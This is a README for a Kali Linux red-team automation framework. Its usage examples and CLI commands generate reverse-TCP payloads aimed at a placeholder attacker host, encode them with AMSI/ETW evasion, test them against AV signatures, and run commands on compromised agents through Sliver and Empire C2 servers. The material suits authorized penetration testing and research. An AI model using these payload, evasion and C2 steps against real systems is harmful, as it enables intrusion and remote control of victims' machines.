# KaliAgent v3 🍀

**Native Kali Linux Integration & Security Automation Framework**

**Version:** 3.0.0  
**Status:** Production Ready  
**Last Updated:** April 21, 2026  

---

## 🎯 Overview

KaliAgent v3 is a comprehensive security automation framework that integrates natively with Kali Linux, providing:

- **600+ Tool Database** - Complete Kali tool catalog with search, install, and management
- **Hardware Integration** - WiFi adapter, SDR device detection and configuration
- **Weaponization Engine** - Payload generation, encoding, evasion, and testing
- **C2 Infrastructure** - Multi-framework C2 management (Sliver, Empire)
- **Production Monitoring** - Resource monitoring, security auditing, compliance

---

## 🚀 Quick Start

### Installation

```bash
# Clone repository
cd /home/user/agentic-ai/agentic_ai

# Run setup
python3 setup.py install

# Verify installation
python3 -m kali_agent_v3 --version
```

### First Run

```bash
# Check system status
python3 -m kali_agent_v3.core.hardware_manager --status

# Search for tools
python3 -m kali_agent_v3.core.tool_manager --search nmap

# Install a tool
python3 -m kali_agent_v3.core.tool_manager --install nmap
```

---

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [WEAPONIZATION_GUIDE.md](docs/WEAPONIZATION_GUIDE.md) | Payload generation, encoding, testing |
| [API_REFERENCE.md](docs/API_REFERENCE.md) | Complete API documentation |
| [INSTALLATION.md](docs/INSTALLATION.md) | Detailed installation guide |
| [SECURITY.md](docs/SECURITY.md) | Security best practices |

---

## 🏗️ Architecture

```
kali_agent_v3/
├── core/              # Foundation modules
│   ├── kali_integration.py    # Kali detection & repo config
│   ├── tool_manager.py        # 600+ tool database
│   ├── hardware_manager.py    # WiFi/SDR detection
│   ├── installation_profiles.py  # Installation profiles
│   └── authorization.py       # Safety gates (4 levels)
│
├── weaponization/     # Payload engine
│   ├── payload_generator.py   # MSFVenom integration
│   ├── encoder.py             # 9 encoders + AMSI/ETW
│   ├── testing_framework.py   # 8 test types
│   ├── weaponization_engine.py # End-to-end orchestration
│   └── av_signatures.py       # 23 AV signatures
│
├── c2/                # C2 infrastructure
│   ├── sliver_client.py       # Sliver C2 client
│   ├── empire_client.py       # Empire REST API
│   ├── docker_deploy.py       # Docker + Terraform
│   └── orchestration.py       # Multi-C2 management
│
├── production/        # Production readiness
│   ├── monitoring.py          # Resource monitoring
│   └── security_audit.py      # Security hardening
│
└── docs/              # Documentation
    ├── WEAPONIZATION_GUIDE.md
    ├── API_REFERENCE.md
    └── README.md
```

---

## 🎓 Usage Examples

### Tool Management

```python
from core.tool_manager import ToolManager

manager = ToolManager()

# Search tools
tools = manager.search_tools('nmap')

# Install tool
manager.install_tool('nmap')

# Get tool info
tool = manager.get_tool('nmap')
print(f"Description: {tool.description}")
print(f"Category: {tool.category}")
```

### Hardware Detection

```python
from core.hardware_manager import HardwareManager

hw = HardwareManager()

# Detect WiFi adapters
adapters = hw.detect_wifi_adapters()
for adapter in adapters:
    print(f"{adapter.interface}: {adapter.chipset}")
    print(f"  Monitor: {adapter.monitor_capable}")
    print(f"  Injection: {adapter.injection_capable}")

# Enable monitor mode
success, monitor_iface = hw.enable_monitor_mode('wlan0')
print(f"Monitor interface: {monitor_iface}")

# Detect SDR devices
rtl = hw.detect_rtlsdr()
print(f"RTL-SDR devices: {len(rtl)}")
```

### Payload Generation

```python
from weaponization.weaponization_engine import WeaponizationEngine
from payload_generator import Platform

engine = WeaponizationEngine()

# Quick weaponization
report = engine.quick_weaponize(
    name='reverse_tcp',
    lhost='192.0.2.100',
    lport=4444,
    platform=Platform.WINDOWS
)

print(f"Status: {report.success}")
print(f"Payload: {report.final_payload_path}")
print(f"Risk Score: {report.test_report.risk_score:.1f}/10")
```

### C2 Orchestration

```python
from c2.orchestration import C2Orchestrator, C2FrameworkType, C2Server

orch = C2Orchestrator()

# Add C2 servers
sliver = C2Server(
    id='sliver_1',
    name='Primary Sliver',
    framework=C2FrameworkType.SLIVER,
    host='192.0.2.100',
    port=31337,
    status='online'
)
orch.add_c2_server(sliver)

# Connect and sync
orch.connect_to_server('sliver_1')
orch.sync_agents()

# Execute command
agents = orch.list_agents()
for agent in agents:
    success, output = orch.execute_command(agent.id, 'whoami')
    print(f"{agent.name}: {output}")
```

### System Monitoring

```python
from production.monitoring import SystemMonitor

monitor = SystemMonitor()

# Get health status
health = monitor.get_health_status()
print(f"Status: {health.status}")
print(f"CPU: {health.cpu_usage:.1f}%")
print(f"Memory: {health.memory_usage:.1f}%")
print(f"Disk: {health.disk_usage:.1f}%")

# Export report
report_path = monitor.export_report()
```

### Security Auditing

```python
from production.security_audit import SecurityAuditor

auditor = SecurityAuditor()

# Run security scan
findings = auditor.run_security_checks()

# Get security score
score = auditor.get_security_score()
print(f"Score: {score['score']}/100 (Grade: {score['grade']})")

# View findings
for finding in findings:
    print(f"[{finding.level.value.upper()}] {finding.title}")
    print(f"  Remediation: {finding.remediation}")
```

---

## 🔧 CLI Reference

### Core Modules

```bash
# Tool management
python3 -m kali_agent_v3.core.tool_manager --search nmap
python3 -m kali_agent_v3.core.tool_manager --install nmap

# Hardware
python3 -m kali_agent_v3.core.hardware_manager --status
python3 -m kali_agent_v3.core.hardware_manager --detect-wifi

# Profiles
python3 -m kali_agent_v3.core.installation_profiles --list
python3 -m kali_agent_v3.core.installation_profiles --install standard

# Authorization
python3 -m kali_agent_v3.core.authorization --check nmap_scan
python3 -m kali_agent_v3.core.authorization --authorize sql_injection --pin 1234
```

### Weaponization

```bash
# Payload generation
python3 -m kali_agent_v3.weaponization.payload_generator --lhost 192.0.2.100 --lport 4444

# Encoding
python3 -m kali_agent_v3.weaponization.encoder --encode payload.exe --encoder xor_dynamic

# Testing
python3 -m kali_agent_v3.weaponization.testing_framework --test payload.exe

# Full weaponization
python3 -m kali_agent_v3.weaponization.weaponization_engine --quick --lhost 192.0.2.100
```

### C2 Infrastructure

```bash
# Sliver
python3 -m kali_agent_v3.c2.sliver_client --connect grpc://localhost:31337
python3 -m kali_agent_v3.c2.sliver_client --generate reverse_https

# Empire
python3 -m kali_agent_v3.c2.empire_client --connect https://localhost:1337
python3 -m kali_agent_v3.c2.empire_client --create-listener http_main

# Orchestration
python3 -m kali_agent_v3.c2.orchestration --add-server sliver_1 --framework sliver
python3 -m kali_agent_v3.c2.orchestration --sync-agents
python3 -m kali_agent_v3.c2.orchestration --health-check
```

### Production

```bash
# Monitoring
python3 -m kali_agent_v3.production.monitoring --status
python3 -m kali_agent_v3.production.monitoring --alerts
python3 -m kali_agent_v3.production.monitoring --export

# Security
python3 -m kali_agent_v3.production.security_audit --scan
python3 -m kali_agent_v3.production.security_audit --score
python3 -m kali_agent_v3.production.security_audit --findings
```

---

## 📊 Project Statistics

| Metric | Value |
|--------|-------|
| **Total Tools** | 602 |
| **Tool Categories** | 21 |
| **Encoders** | 9 |
| **AV Signatures** | 23 |
| **C2 Frameworks** | 2 (Sliver, Empire) |
| **Test Types** | 8 |
| **Authorization Levels** | 4 |
| **Compliance Standards** | 5 (CIS, NIST, PCI-DSS, HIPAA, GDPR) |
| **Total Code** | ~630KB |
| **Modules** | 19 |

---

## 🔒 Security Notice

**⚠️ WARNING:** This tool is for **authorized security testing only**.

- Use only in isolated lab environments
- Obtain proper authorization before testing
- Never deploy against systems you don't own
- Follow all applicable laws and regulations

**Responsible Use:**
- Penetration testing with written authorization
- Security research in controlled environments
- Educational purposes in isolated labs
- Red team exercises with proper scope

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Run tests
5. Submit a pull request

---

## 📝 License

This project is licensed under the MIT License - see LICENSE file for details.

---

## 👥 Credits

**Created by:** Wesley Robbins  
**Version:** 3.0.0  
**Date:** April 21, 2026  

**Special Thanks:**
- Kali Linux Team
- Sliver C2 Team
- Empire C2 Team
- Metasploit Team
- Open Source Security Community

---

## 📞 Support

- **Documentation:** See `docs/` directory
- **Issues:** Open an issue on GitHub
- **Discussions:** GitHub Discussions

---

*Built with 🍀 for the security community*
